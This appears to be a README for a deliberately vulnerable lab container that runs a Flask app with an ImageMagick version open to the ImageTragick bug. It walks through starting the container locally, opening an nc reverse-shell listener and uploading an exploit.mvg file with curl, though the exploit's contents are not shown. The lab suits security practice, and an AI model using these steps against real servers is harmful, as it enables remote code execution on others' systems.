# docker-imagetragick

Run a containerised Flask app that relies on a version of ImageMagic that is vulnerable to the ImageTragick bug.

## Steps

1. Download this image and create a container:

        $ docker run -d --name imagetragick -p 127.0.0.1:8080:8080 craighurley/docker-imagetragick

2. Listen for the reverse shell:

        $ nc -l -n -vvv -p 4443

3. Edit the contents of `exploit.mvg` so that it uses the correct IP address that `nc` is listening on.

4. Upload exploit to vulnerable application:

        $ curl -v -F file=@exploit.mvg http://127.0.0.1:8080

## Links

https://imagetragick.com/
